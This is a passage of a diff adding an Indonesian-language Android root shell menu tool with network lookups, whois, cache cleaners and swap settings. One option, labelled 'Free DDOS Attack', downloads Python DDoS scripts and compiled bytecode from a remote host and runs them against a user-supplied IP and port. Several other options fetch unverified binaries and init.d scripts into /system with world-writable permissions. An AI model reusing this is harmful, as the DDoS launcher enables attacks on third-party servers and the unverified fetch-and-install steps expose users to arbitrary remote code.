+		if [ `curl ipinfo.io/ 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Organisasi: "
+					curl ipinfo.io/ 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+				else
+					echo "Organisasi: -"
+				fi
+		echo ""
+		echo $balek
+		read enterKey
+		nettool
+	elif [ $cekme -eq 2 ]; then
+		echo ""
+		echo -n "IP/Domain: "
+		read lihat
+		echo ""
+		echo -n "IP: "
+		curl ipinfo.io/$lihat 2>/dev/null | grep "ip" | awk '{ print $2, $3 }'
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Hostname: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Hostname: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Kota: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Kota: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Wilayah: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Wilayah: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Negara: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Negara: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Lintang Bujur: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }'
+		else
+			echo "Lintang Bujur: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Kode Pos: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+		else
+			echo "Kode Pos: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Organisasi: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+		else
+			echo "Organisasi: -"
+		fi
+		echo ""
+		echo $balek
+		read enterKey
+		nettool
+	elif [ $cekme -eq 3 ]; then
+			nettool
+	else
+		clear
+		echo "Perintah Salah..."
+		sleep 3
+		exit
+	fi
+elif [ $option -eq 10 ]; then
+	if [ -d $tmpsd/Whois/ ]; then
+		clear
+		echo ""
+		echo "             Deteksi Pemilik IP"
+		echo ""
+		echo "1. Deteksi Sebagian Penting"
+		echo "2. Deteksi Semuanya"
+		echo "3. Kembali"
+		echo -n "Pilih opsi di atas: "
+		read miliho
+		if [ $miliho -eq 1 ]; then
+			echo ""
+			echo -n "Tulis Domain: "
+			read hayosiapa
+			echo ""
+			echo `whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Admin|Name Server"` >> $tmpsd/Whois/$hayosiapa-lite.txt
+			whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Admin|Name Server"
+			echo ""
+			echo "Data telah disimpan ke Memori Internal dengan folder /sdcard/nettool/Whois/disini"
+			echo $balek
+			read enterKey
+			nettool
+		elif [ $miliho -eq 2 ]; then
+			echo ""
+			echo -n "Tulis Domain: "
+			read hayosiapa
+			echo ""
+			echo `whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Registrant|Admin|Tech|Billing|Sponsoring|Name|DNSSEC|DS|Algorithm|Digest"` >> $tmpsd/Whois/$hayosiapa-full.txt
+			whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Registrant|Admin|Tech|Billing|Sponsoring|Name|DNSSEC|DS|Algorithm|Digest"
+			echo ""
+			echo "Data telah disimpan ke Memori Internal dengan folder /sdcard/nettool/Whois/disini"
+			echo $balek
+			read enterKey
+			nettool
+		elif [ $miliho -eq 3 ]; then
+			nettool
+		else
+			echo "Perintah salah"
+			sleep 3
+			exit
+		fi
+	else
+		mkdir $tmpsd/Whois/
+		chmod 777 $tmpsd/Whois/
+		clear
+		echo ""
+		echo "             Deteksi Pemilik IP"
+		echo ""
+		echo "1. Deteksi Sebagian Penting"
+		echo "2. Deteksi Semuanya"
+		echo "3. Kembali"
+		echo -n "Pilih opsi di atas: "
+		read miliho
+		if [ $miliho -eq 1 ]; then
+			echo ""
+			echo -n "Tulis Domain: "
+			read hayosiapa
+			echo ""
+			echo `whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Admin|Name Server"` >> $tmpsd/Whois/$hayosiapa-lite.txt
+			whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Admin|Name Server"
+			echo ""
+			echo "Data telah disimpan ke Memori Internal dengan folder /sdcard/nettool/Whois/disini"
+			echo $balek
+			read enterKey
+			nettool
+		elif [ $miliho -eq 2 ]; then
+			echo ""
+			echo -n "Tulis Domain: "
+			read hayosiapa
+			echo ""
+			echo `whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Registrant|Admin|Tech|Billing|Sponsoring|Name|DNSSEC|DS|Algorithm|Digest"` >> $tmpsd/Whois/$hayosiapa-full.txt
+			whois $hayosiapa | grep -E "Domain|Created|Last|Expiration|Status|Registrant|Admin|Tech|Billing|Sponsoring|Name|DNSSEC|DS|Algorithm|Digest"
+			echo ""
+			echo "Data telah disimpan ke Memori Internal dengan folder /sdcard/nettool/Whois/disini"
+			echo $balek
+			read enterKey
+			nettool
+		elif [ $miliho -eq 3 ]; then
+			nettool
+		else
+			echo "Perintah salah"
+			sleep 3
+			exit
+		fi
+	fi
+elif [ $option -eq 11 ]; then
+		if [ -f /data/data/com.googlecode.pythonforandroid/files/python/bin/python ]; then
+		if [ ! -f /system/bin/py ]; then
+			wget -O $filetmp/py http://sudonano.pe.hu/python/py 2>/dev/null
+			mv $filetmp/py /system/bin/py 2>/dev/null
+			chmod 755 /system/bin/py 2>/dev/null
+		fi
+		clear
+		echo ""
+		echo "               Free DDOS Attack"
+		echo ""
+		echo "1. DDos 1"
+		echo "2. DDos 2"
+		echo "3. DDos 3"
+		echo "4. DDos 4"
+		echo "9. Kembali"
+		echo -n "Pilih pilihan di atas: "
+		read pilihan
+		if [ $pilihan -eq 1 ]; then
+			if [ ! -f $filetmp/ddos1.py ]; then
+				wget -O $filetmp/ddos1.py http://sudonano.pe.hu/python/ddos1.py 2>/dev/null
+				py $filetmp/ddos1.py
+			else
+				py $filetmp/ddos1.py
+			fi
+		elif [ $pilihan -eq 2 ]; then
+			if [ ! -f $filetmp/ddos2.py ]; then
+				wget -O $filetmp/ddos2.py http://sudonano.pe.hu/python/ddos2.py 2>/dev/null
+				echo -n "Domain/IP: "
+				read ipnya
+				echo -n "Port: "
+				read portnya
+				py $filetmp/ddos2.py $ipnya $portnya
+			else
+				echo -n "Domain/IP: "
+				read ipnya
+				echo -n "Port: "
+				read portnya
+				py $filetmp/ddos2.py $ipnya $portnya
+			fi
+		elif  [ $pilihan -eq 3 ]; then
+			if [ ! -f $filetmp/ddos3.py ]; then
+				wget -O $filetmp/ilucx.pyc http://sudonano.pe.hu/python/ilucx/ilucx.pyc 2>/dev/null
+				wget -O $filetmp/ddos3.py http://sudonano.pe.hu/python/ilucx/run.py 2>/dev/null
+				py $filetmp/ddos3.py
+			else
+				py $filetmp/ddos3.py
+			fi
+		elif  [ $pilihan -eq 4 ]; then
+			if [ ! -f $filetmp/ddos3.py ]; then
+				wget -O $filetmp/ilucx2.pyc http://sudonano.pe.hu/python/udpilucx/ilucx2.pyc 2>/dev/null
+				wget -O $filetmp/ddos4.py http://sudonano.pe.hu/python/udpilucx/run.py 2>/dev/null
+				py $filetmp/ddos4.py
+			else
+				py $filetmp/ddos4.py
+			fi
+		elif [ $pilihan -eq 9 ]; then
+			nettool
+		fi
+		else
+		if [ ! -f $tmpsd/python4android.apk ]; then
+			echo -n "Mengunduh file apk "
+			wget -O $tmpsd/python4android.apk http://sudonano.pe.hu/python/pyapk 2>/dev/null
+			echo "Mengecek file"
+			if [ -f $tmpsd/python4android.apk ]; then
+				echo "File sudah terunduh python4android.apk di memori internal folder nettool, silahkan di install terlebih dahulu"
+				read enterKey
+				nettool
+			else
+				echo "File tidak ada"
+				read enterKey
+				nettool
+			fi
+		else
+			if [ -f $tmpsd/python4android.apk ]; then
+				echo "File terunduh didalam folder sdcard/nettool atau memori internal dengan file python4android.apk"
+				echo "Silahkan install terlebih dahulu dan menginstall binary pack terdapat di aplikasi itu"
+				read enterKey
+				nettool
+			else
+				echo "File tidak ada"
+				read enterKey
+				nettool
+			fi
+		fi
+		fi
+elif [ $option -eq 12 ]; then
+	if [ ! -f /system/bin/ssh 2>/dev/null && ! -f /system/xbin/ssh 2>/dev/null ]; then
+		echo "Lakukan pemasangan SSH dan SFTP..."
+		echo $balek
+		read enterKey
+	else
+		if [ ! -f $filetmp/penggunalinux.txt ]; then
+			echo "Gunakan perintah 'exit' untuk keluar dari sesi linux"
+			echo ""
+			echo -n "Nama Pengguna: "
+			read pengguna
+			echo ""
+			echo "Ingin menyimpan untuk login tanpa memasukkan nama pengguna?"
+			echo "1 = Iya, 2 = Tidak"
+			read milihmana
+			if [ $milihmana -eq 1 ]; then
+				if [ -f $filetmp/penggunalinux.txt ]; then rm -f $filetmp/penggunalinux.txt; fi
+				echo $pengguna >> $filetmp/penggunalinux.txt
+				clear
+				ssh $pengguna@localhost
+				nettool
+			elif [ $milihmana -eq 2 ]; then
+				clear
+				ssh $pengguna@localhost
+				nettool
+			else
+				echo "Error"
+				exit
+			fi
+		else
+			pengguna=`cat $filetmp/penggunalinux.txt`
+			clear
+			ssh $pengguna@localhost
+			nettool
+		fi
+	fi
+elif [ $option -eq 20 ]; then
+	clear
+	echo "=========================================================="
+	echo ""
+	echo "           Free Menu Utilitas Powered by Nano"
+	echo ""
+	echo "=========================================================="
+	echo "   Reboot untuk mengembalikan opsi 'optimasi' kesemula    "
+	echo "=========================================================="
+	echo ""
+	echo "Menu Utilitas:"
+	echo "1. Full Cleaner"
+	echo "2. Cleaner APK"
+	echo "3. Cleaner Dalvik Cache"
+	echo "4. Nomor Generator"
+	echo "=========================================================="
+	echo "5. Optimasi Baterai Android"
+	echo "6. Hapus Optimasi Android"
+	echo "7. Pasang Seeder"
+	echo "8. Hapus Seeder"
+	echo "9. Atur Swap"
+	echo "=========================================================="
+	echo "10. Hapus Pengguna Linux (Option 10)"
+	echo "11. Host Latency Booster (Option 7)"
+	echo "12. Waktu Latency Booster (Option 7)"
+	echo "=========================================================="
+	echo "20. Pasang NMAP\e[0m"
+	echo "21. Pasang AIRCRACK\e[0m"
+	echo "22. Pasang SSH dan FTP\e[0m"
+	echo "=========================================================="
+	echo "\e[93m100. Uninstall\e[0m"
+	echo "\e[93m101. Update NETTOOLS\e[0m"
+	echo "\e[93m102. Reboot\e[0m"
+	echo "=========================================================="
+	echo "110. Apply Optimasi Baterai Manual"
+	echo "111. Kembali"
+	echo ""
+	echo "=========================================================="
+	echo -n "Pilih angka yang tersedia: "
+	read opsi
+	if [ $opsi -eq 1 ]; then
+		echo ""
+		echo "Menghitung..."
+		for sampahmelimpah in $fullcache
+		do
+		if [ `du -shc $sampahmelimpah 2> /dev/null | tail -1 | cut -f 1` == 0 ]; then
+			echo -n "\e[1;32mPerangkat kamu sudah dibersihkan...\e[0m"
+			echo \e[1;32m$balek\e[0m
+			read enterKey
+			nettool
+		else
+			echo -n "Cache Aplikasi: \e[1;31m"
+			echo `du -shc $sampahmelimpah 2> /dev/null | tail -1 | cut -f 1`
+			echo "\e[0m"
+			echo -n "Ingin membersihkannya (y/n)? "
+			read jawab
+			if [ $jawab == y ]; then
+				echo -n "Sedang menghapus sampah"
+				sleep 1
+				echo -n "."
+				echo `du -shc $sampahmelimpah 2> /dev/null | tail -1 | cut -f 1` >> $tmpsd/total.txt
+				rm -f $sampahmelimpah 2> /dev/null
+				rm -rf $sampahmelimpah 2> /dev/null
+				sleep 1
+				echo -n "."
+				rm -f /sdcard/DCIM/.thumbnails/* 2> /dev/null
+				if [ -e /dev/log/main ]; then
+				  rm -f /dev/log/main
+				fi
+				rm -f /data/dalvik-cache/*.apk
+				rm -f /data/dalvik-cache/*.tmp
+				sleep 1
+				echo "."
+				bebas=`cat $tmpsd/total.txt`
+				echo ""
+				echo "\e[1;32m$bebas sudah dibebaskan!\e[0m"
+				echo $balek
+				read enterKey
+				rm -f $tmpsd/total.txt
+				nettool
+			elif [ $jawab == n ]; then
+				nettool
+			else
+				echo "Perintah Salah"
+				sleep 3
+				exit
+			fi
+		fi
+		done
+	elif [ $opsi -eq 2 ]; then
+		echo ""
+		echo -n "Menghitung APK..."
+		echo ""
+		if [ `find /sdcard/ -type f -name "*.apk" 2> /dev/null | wc -l` == 0 ]; then
+			echo -n "\e[1;32mFile APK lama sudah dibebaskan semua, enter untuk kembali\e[0m"
+			read enterKey
+			nettool
+		else
+			calc=`find /sdcard/ -type f -name "*.apk" 2> /dev/null | wc -l`
+			echo -n "Total Sampah APK $calc file, ingin menghapusnya (y/n)? "
+			read jawab
+			if [ $jawab == y ]; then
+				echo -n "Sedang menghapus file APK"
+				sleep 1
+				echo -n "."
+				echo `find /sdcard/ -type f -name "*.apk" 2> /dev/null | wc -l` >> $tmpsd/total.txt
+				sleep 1
+				echo -n "."
+				sleep 1
+				echo -n "."
+				sleep 1
+				echo -n "."
+				sleep 1
+				echo -n "."
+				rm -f $fullapk 2> /dev/null
+				echo ""
+				totalapknya=`cat $tmpsd/total.txt`
+				echo "\e[1;32m$totalapknya APK berhasil dihapus!\e[0m"
+				echo $balek
+				read enterKey
+				rm -f $tmpsd/total.txt
+				nettool
+			elif [ $jawab == n ]; then
+				nettool
+			else
+				echo "Perintah Salah"
+				sleep 3
+				exit
+			fi
+		fi
+	elif [ $opsi -eq 3 ]; then
+		echo ""
+		echo "Menghitung Dalvik Cache..."
+		sleep 3
+		echo -n "Total Dalvik Cache: "
+		echo `du -shc /data/dalvik-cache/* 2> /dev/null | tail -1 | cut -f 1`
+		echo ""
+		sleep 1
+		echo "Menghapus akan membuat booting awal menunggu lama dan membuat perangkat fresh"
+		echo "Proses akan reboot otomatis"
+		echo -n "Ingin menghapus Dalvik Cache (y/n)? "
+		read jawab
+		if [ $jawab == y ]; then
+			echo -n "Sedang menghapus Dalvik Cache"
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			echo `du -shc /data/dalvik-cache/* 2> /dev/null | tail -1 | cut -f 1` >> $filetmp/totaldc.txt
+			rm -rf /data/dalvik-cache/* 2> /dev/null
+			bebas=`cat $filetmp/totaldc.txt`
+			echo ""
+			echo "\e[1;32m$bebas sudah dibebaskan dari Dalvik Cache!\e[0m"
+			echo -n "Perangkat akan di nyalakan ulang dalam 5 detik"
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo "."
+			rm -rf $filetmp/totaldc.txt
+			reboot
+		elif [ $jawab == n ]; then
+			nettool
+		else
+			echo "Perintah Salah"
+			sleep 3
+			exit
+		fi
+	elif [ $opsi -eq 4 ]; then
+		clear
+		echo "=========================================================="
+		echo "                      Kocok Nomer                         "
+		echo "=========================================================="
+		echo ""
+		echo -n "No. Maksimal: "
+		read nomer
+		if [ $nomer -gt 0 ]; then
+			sleep 1
+			echo -n "Hasil:\e[1;32m "
+			echo $((RANDOM % $nomer))
+			echo "\e[0m"
+			sleep 1
+			echo $balek
+			read enterKey
+			nettool
+		else
+			clear
+			echo "Perintah salah"
+			sleep 3
+			exit
+		fi
+	elif [ $opsi -eq 5 ]; then
+		if [ -f /system/etc/init.d/nanocop >/dev/null ]; then
+			echo "Android sudah di optimasi, enter untuk kembali"
+			read enterKey
+			nettool
+		else
+			echo -n "Cek koneksi"
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			if ping -q -c 1 -W 1 google.com >/dev/null; then
+				echo "\e[1;32m OK!\e[0m"
+				sleep 1
+				echo "Mengambil berkas dari server..."
+				wget -O $tmpsd/nanocop.txt http://sudonano.pe.hu/optimusnano/nanocop &> /dev/null
+				wget -O $tmpsd/sysctl.conf http://sudonano.pe.hu/optimusnano/sysctl.conf &> /dev/null
+				sleep 2
+				echo $pasangsistem
+				mv $tmpsd/nanocop.txt /system/etc/init.d/nanocop &> /dev/null
+				mv $tmpsd/sysctl.conf /system/etc/sysctl.conf &> /dev/null
+				sleep 2
+				echo $ijinsistem
+				chmod 777 /system/etc/init.d/nanocop &> /dev/null
+				chmod 644 /system/etc/sysctl.conf &> /dev/null
+				sleep 2
+				echo "Android sudah teroptimasi, reboot untuk menerapkan optimasi"
+				echo $balek
+				read enterKey
+				nettool
+			else
+				echo "\e[1;31m GAGAL!\e[0m"
+				sleep 1
+				echo ""
+				echo "Koneksi mati atau tidak bisa di gunakan, silahkan cek koneksi dan ulangi kembali"
+				echo $balek
+				read enterKey
+				nettool
+			fi
+		fi
+	elif [ $opsi -eq 6 ]; then
+		if [ -f /system/etc/init.d/nanocop 2>/dev/null ]; then
+			rm -f /system/etc/init.d/91sqlite &> /dev/null
+			rm -f /system/etc/init.d/90zipalign &> /dev/null
+			rm -f /system/etc/init.d/nanocop &> /dev/null
+			rm -f /system/etc/init.d/MPEngine9X &> /dev/null
+			rm -d /system/mpengine/ &> /dev/null
+			rm -f /system/xbin/sqlite3 &> /dev/null
+			rm -f /system/xbin/zipalign &> /dev/null
+			rm -f /system/etc/sysctl.conf &> /dev/null
+			echo "Optimasi Android sudah di reset"
+			sleep 2
+			nettool
+		else
+			echo "Optimasi belum dilakukan..."
+			echo $balek
+			read enterKey
+			nettool
+		fi
+	elif [ $opsi -eq 7 ]; then
+		if [ -f /system/etc/init.d/Seeder >/dev/null ]; then
+			echo "Seeder sudah terpasang.."
+			echo $balek
+			read enterKey
+			nettool
+		else
+			echo -n "Cek koneksi"
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			if ping -q -c 1 -W 1 google.com >/dev/null; then
+				echo "\e[1;32m OK!\e[0m"
+				sleep 1
+				echo "Mengambil berkas dari server..."
+				wget -O $tmpsd/speed http://sudonano.pe.hu/seeder/speed &> /dev/null
+				wget -O $tmpsd/speedentro http://sudonano.pe.hu/seeder/speedentro &> /dev/null
+				wget -O $tmpsd/speedrgnd http://sudonano.pe.hu/seeder/speedrgnd &> /dev/null
+				echo $pasangsistem
+				sleep 2
+				mv $tmpsd/speed /system/etc/init.d/Seeder &> /dev/null
+				mv $tmpsd/speedentro /system/xbin/entro &> /dev/null
+				mv $tmpsd/speedrgnd /system/xbin/rngd &> /dev/null
+				echo $ijinsistem
+				chmod 777 /system/etc/init.d/Seeder &> /dev/null
+				chmod 755 /system/xbin/entro &> /dev/null
+				chmod 755 /system/xbin/rngd &> /dev/null
+				echo "Seeder selesai dipasang, reboot untuk menerapkan"
+				echo $balek
+				read enterKey
+				nettool
+			else
+				echo "\e[1;31m GAGAL!\e[0m"
+				sleep 1
+				echo ""
+				echo "Koneksi mati atau tidak bisa di gunakan, silahkan cek koneksi dan ulangi kembali"
+				echo $balek
+				read enterKey
+				nettool
+			fi
+		fi
+	elif [ $opsi -eq 8 ]; then
+		if [ -f /system/etc/init.d/Seeder >/dev/null ]; then
+			rm -f /system/etc/init.d/Seeder
+			if [ -f /system/etc/init.d/Seeder ]; then rm -f /system/etc/init.d/Seeder 2> /dev/null; fi
+			if [ -f /system/xbin/entro ]; then rm -f /system/xbin/entro 2> /dev/null; fi
+			if [ -f /system/xbin/rngd ]; then rm -f /system/xbin/rngd 2> /dev/null; fi
+			echo "Entropy sudah di reset, reboot untuk menerapkan"
+			sleep 2
+			nettool
+		else
+			echo "Seeder belum terpasang..."
+			echo $balek
+			read enterKey
+			nettool
+		fi
+	elif [ $opsi -eq 9 ]; then
+		clear
+		echo "               Pengaturan Swap"
+		echo ""
+		echo "1. 0,5 GB"
+		echo "2. 1 GB"
+		echo "3. 1,5 GB"
+		echo "4. 2 GB"
+		echo "5. Kembali"
+		echo ""
+		echo -n "Pilih angka yang tersedia [1-4]: "
+		read swapchoose
+		if [ $swapchoose -eq 1 ]; then
+			echo "Swap di ubah menjadi 0,5 GB.."
+			sleep 1
+			echo "Mematikan Swap..."
+			swapoff /dev/block/zram0
+			sleep 1
+			echo "Reset swap..."
+			echo 1 > /sys/block/zram0/reset
+			sleep 1
+			echo "Mengatur swap menjadi 0,5 GB"
+			echo 512M > /sys/block/zram0/disksize
+			sleep 1
+			echo "Membuat file swap..."
+			mkswap /dev/block/zram0
+			sleep 1
+			echo "Menghidupkan Swap"
+			swapon /dev/block/zram0
+			echo "Swap sudah dirubah menjadi 0,5 GB, $balek"
+			read enterKey
+			nettool
+		elif [ $swapchoose -eq 2 ]; then
+			echo "Swap di ubah menjadi 1 GB.."
+			sleep 1
+			echo "Mematikan Swap..."
+			swapoff /dev/block/zram0
+			sleep 1
+			echo "Reset swap..."
+			echo 1 > /sys/block/zram0/reset
+			sleep 1
+			echo "Mengatur swap menjadi 1 GB"
+			echo 1024M > /sys/block/zram0/disksize
+			sleep 1
+			echo "Membuat file swap..."
+			mkswap /dev/block/zram0
+			sleep 1
+			echo "Menghidupkan Swap"
+			swapon /dev/block/zram0
+			echo "Swap sudah dirubah menjadi 1 GB, $balek"
+			read enterKey
+			nettool
+		elif [ $swapchoose -eq 3 ]; then
+			echo "Swap di ubah menjadi 1,5 GB.."
+			sleep 1
+			echo "Mematikan Swap..."
+			swapoff /dev/block/zram0
+			sleep 1
+			echo "Reset swap..."
+			echo 1 > /sys/block/zram0/reset
+			sleep 1
+			echo "Mengatur swap menjadi 1,5 GB"
+			echo 1536M > /sys/block/zram0/disksize
+			sleep 1
+			echo "Membuat file swap..."
+			mkswap /dev/block/zram0
+			sleep 1
+			echo "Menghidupkan Swap"
+			swapon /dev/block/zram0
+			echo "Swap sudah dirubah menjadi 1,5 GB, $balek"
+			read enterKey
+			nettool
+		elif [ $swapchoose -eq 4 ]; then
+			echo "Swap di ubah menjadi 2 GB.."
+			sleep 1
+			echo "Mematikan Swap..."
+			swapoff /dev/block/zram0
+			sleep 1
+			echo "Reset swap..."
+			echo 1 > /sys/block/zram0/reset
+			sleep 1
+			echo "Mengatur swap menjadi 2 GB"
+			echo 2048M > /sys/block/zram0/disksize
+			sleep 1
+			echo "Membuat file swap..."
+			mkswap /dev/block/zram0
+			sleep 1
+			echo "Menghidupkan Swap"
+			swapon /dev/block/zram0
+			echo "Swap sudah dirubah menjadi 2 GB, $balek"
+			read enterKey
+			nettool
+		elif [ $swapchoose -eq 5 ]; then
+			nettool
+		else
+			echo "Perintah salah"
+			exit
+		fi
+	elif [ $opsi -eq 10 ]; then
+		if [ -f $filetmp/penggunalinux.txt ]; then
+			rm -f $filetmp/penggunalinux.txt
+			echo "Nama pengguna sudah terhapus"
+			echo $balek
+			read enterKey
+			nettool
+		else
+			echo "Belum mengatur nama pengguna"
+			echo $balek
+			read enterKey
+			nettool
+		fi
+	elif [ $opsi -eq 11 ]; then
+			clear
+			echo "Ganti Host, default server XL/AXIS"
+			echo "1. Telkomsel"
+			echo "2. Indosat"
+			echo "3. XL/AXIS"
+			echo "4. Smartfren"
+			echo "5. Three"
+			echo "6. Google"
+			echo "7. Yaru"
+			echo "8. VK"
+			echo "9. Kembali"
+			echo -n "Pilih angka yang tersedia: "
+			read hostbooster
+			if [ $hostbooster -eq 1 ]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "ns4.telkomsel.co.id" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server telkomsel"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 2 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "sadewa.indosatooredoo.com" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server Indosat"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 3 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "snbdc-dns2.xl.net.id" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server XL/AXIS"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 4 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "ns3.smartfren.com" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server Smartfren"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 5 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "dns2.nap.net.id" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server Tri"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 6 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "ns1.google.net" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server Google"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 7 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "ya.ru" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server Yaru"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 8 ]]; then
+					rm -f /data/lognettool/pingtool.txt &>/dev/null
+					echo "vk.com" >> /data/lognettool/pingtool.txt;
+					echo "Host server telah di ubah ke server VK"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $hostbooster -eq 9 ]]; then
+				nettool
+			else
+				echo "Perintah Salah"
+				sleep 3
+				exit
+			fi
+	elif [ $opsi -eq 12 ]; then
+			clear
+			echo "Latency waktu, default 200ms, 1000ms = 1 detik"
+			echo "1. 200ms"
+			echo "2. 300ms"
+			echo "3. 500ms"
+			echo "4. 800ms"
+			echo "5. 1000ms"
+			echo "6. 1200ms"
+			echo "7. 1500ms"
+			echo "8. 2000ms"
+			echo "9. Kembali"
+			echo -n "Pilih angka yang tersedia: "
+			read pingbooster
+			if [[ $pingbooster -eq 1 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "0.2" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 200ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 2 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "0.3" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 300ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 3 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "0.5" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 500ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 4 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "0.8" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 800ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 5 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "1" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 1000ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 6 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "1.2" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 1200ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 7 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "1.5" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 1500ms"
+					echo $balek
+					read enterKey
+					nettool
+			elif [[ $pingbooster -eq 8 ]]; then
+					rm -f /data/lognettool/pingtime.txt &>/dev/null
+					echo "2" >> /data/lognettool/pingtime.txt;
+					echo "Waktu Respon telah diubah menjadi 2000ms"
+					echo $balek
+					read enterKey
+					nettool
+			else
+				echo "Perintah Salah"
+				sleep 3
+				exit
+			fi
+	elif [ $opsi -eq 20 ]; then
+		if [ `ifconfig rmnet_data0 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+			echo -n "Cek koneksi"
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			if ping -q -c 1 -W 1 google.com >/dev/null; then
+					echo "\e[1;32m OK!\e[0m"
